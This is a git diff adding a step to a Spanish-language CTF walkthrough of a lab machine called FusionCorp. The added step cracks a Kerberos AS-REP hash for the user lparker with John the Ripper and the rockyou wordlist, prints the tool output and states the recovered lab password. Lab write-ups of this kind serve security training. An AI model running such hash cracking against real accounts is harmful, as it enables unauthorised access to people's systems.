@@ -163,6 +163,23 @@ Ya tenemos los puertos copiado en el Clipboard, un script simple pero de gran ay
 
       ![image](https://github.com/Esevka/CTF/assets/139042999/858ac63d-ad88-45ca-97ba-8c5c99ba2813)
 
+    4)Intentamos crakear el hash del usuario lparker con john
+
+        ┌──(root㉿kali)-[/home/…/ctf/try_ctf/FusionCorp/content]
+        └─# john hashuser_NP --wordlist=/usr/share/wordlists/rockyou.txt 
+        Using default input encoding: UTF-8
+        Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
+        Will run 3 OpenMP threads
+        Press 'q' or Ctrl-C to abort, almost any other key for status
+        !!abbylvzsvs2k6! ($krb5asrep$lparker@FUSION.CORP)     
+        1g 0:00:00:02 DONE (2023-10-14 09:50) 0.4032g/s 991896p/s 991896c/s 991896C/s !ebabaloh..๙า๘ฌน++๘
+        Use the "--show" option to display all of the cracked passwords reliably
+        Session completed.
+
+      Conseguimos credenciales lparker:!!abbylvzsvs2k6!
+
+    
+
   
         
         
